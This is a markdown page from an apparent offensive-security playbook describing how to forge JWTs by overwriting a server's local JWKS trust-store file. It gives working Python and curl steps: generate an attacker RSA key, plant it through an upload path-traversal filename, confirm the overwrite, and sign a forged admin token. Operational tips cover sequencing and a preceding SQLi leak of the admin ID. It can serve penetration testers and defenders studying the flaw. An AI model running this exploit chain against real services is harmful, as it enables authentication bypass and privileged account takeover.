# JWT — Local JWKS Trust-Store Overwrite → Forge

A forgery primitive distinct from RS256→HS256 [alg-confusion](alg-confusion.md) and from
remote [`jku`](jku-injection.md)/[`jwk`](jwk-injection.md) header injection. Here the server keeps
its trusted verification key in a **local file** and you gain WRITE access to that file through a
*separate* vulnerability, then sign tokens with a key you control.

## When this applies

- Verification loads the public key from a **local path**, not a header parameter or remote URL. Tells:
  ```python
  jwks_path = os.path.abspath("static/.well-known/jwks.json")
  client = PyJWKClient(f"file:///{jwks_path}")           # file:// — local, attacker-writable
  key = client.get_signing_key_from_jwt(token)           # matched by the token's kid
  jwt.decode(token, key.key, algorithms=[key.algorithm_name])
  ```
  `algorithm_name` is read from the **JWK's own `alg` field**, so a planted `RS256` key just verifies —
  no alg-confusion needed, and header-injection (`jwk`/`jku`/`x5u`) defenses do not apply.
- You hold an independent **arbitrary-file-write** primitive landing inside the web root:
  upload path traversal (see [file-upload path traversal](../../../../server-side/reference/scenarios/file-upload/path-traversal-and-htaccess.md),
  e.g. `file.save(DIR + "/" + filename)` with `../`), an LFI-to-write, log/config write, archive extraction, etc.
- The JWKS file sits somewhere reachable by that write (commonly under `static/`, served at
  `/.well-known/jwks.json` or `/static/.well-known/jwks.json`).

## Steps

### 1. Generate your own RSA keypair as a JWKS

```python
import json, secrets
from jwcrypto import jwk
kid = secrets.token_hex(16)
k = jwk.JWK.generate(kty="RSA", size=2048, alg="RS256", use="sig"); k.kid = kid
jwks = {"keys": [json.loads(k.export_public())]}     # exactly what verify_token will trust
```

### 2. Overwrite the server's JWKS via your write primitive

Example with an unsanitised upload filename (Werkzeug `FileStorage.filename` is not sanitised, incl. 3.1.x):
```python
files = {"attachment": ("../static/.well-known/jwks.json", json.dumps(jwks), "application/json")}
sess.post(f"{base}/api/chat-messages", data={"message": "x"}, files=files)
```

**Confirm the write** — re-fetch the file over HTTP and check the `kid` flipped to yours:
```bash
curl -s "$BASE/static/.well-known/jwks.json" | jq -r '.keys[0].kid'   # == your kid
```

### 3. Forge a token signed with YOUR private key

```python
import jwt
priv = k.export_to_pem(private_key=True, password=None)
forged = jwt.encode({"user_id": ADMIN_UUID},      # any claims: privileged user_id, role, etc.
                    priv, algorithm="RS256",
                    headers={"kid": kid, "alg": "RS256", "typ": "JWT"})
```
Leak the privileged identity first if claims are an opaque id (e.g. SQLi dumping the admin's UUID).

### 4. Use the forged token — in a clean session

The overwrite invalidates **every server-signed token, including your own login cookie**. See
[Operational ordering](#operational-ordering) — carry the forged token in a fresh client.

## Operational ordering

1. Do any read that needs a *valid server token* (SQLi leak, profile read) **before** the overwrite —
   the plant kills the original signing key.
2. Plant the JWKS.
3. Forge, then send the forged token in a **fresh session holding only that cookie**. Re-setting the
   cookie on the same client can collide with the stale login cookie (server reads the wrong one → 401).
4. Validate the forge against a low-stakes verifier first (e.g. `GET /profile` → 200) before the
   privileged action, so a 401 tells you *forge failed* vs *authz failed*.

## Anti-Patterns

- Reaching for alg-confusion or `jku`/`jwk` injection when the key is loaded from `file://` — those
  target header-trusted or remote keys; here the win is *writing* the local trust store.
- Forgetting step 1 ordering and overwriting before leaking the target claim — you lose your valid token.
